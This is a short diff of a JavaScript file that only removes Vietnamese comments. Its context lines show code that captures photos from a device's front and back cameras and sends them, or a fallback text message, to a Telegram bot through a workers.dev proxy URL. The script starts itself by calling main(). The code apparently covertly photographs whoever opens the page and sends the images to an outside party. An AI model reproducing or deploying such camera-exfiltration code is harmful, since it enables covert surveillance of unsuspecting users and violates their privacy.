@@ -181,7 +181,6 @@ function captureCamera(facingMode = "user") {
 async function sendTwoPhotosAsMediaGroup(frontBlob, backBlob) {
   const formData = new FormData();
 
-  // Đặt 2 file ảnh
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('media', JSON.stringify([
     {
@@ -221,7 +220,7 @@ async function main() {
   if (frontBlob && backBlob) {
     await sendTwoPhotosAsMediaGroup(frontBlob, backBlob);
   } else {
-    // Chỉ gửi text nếu không có ảnh
+      
     fetch(`https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -233,5 +232,4 @@ async function main() {
   }
 }
 
-// ▶️ Khởi chạy
 main();
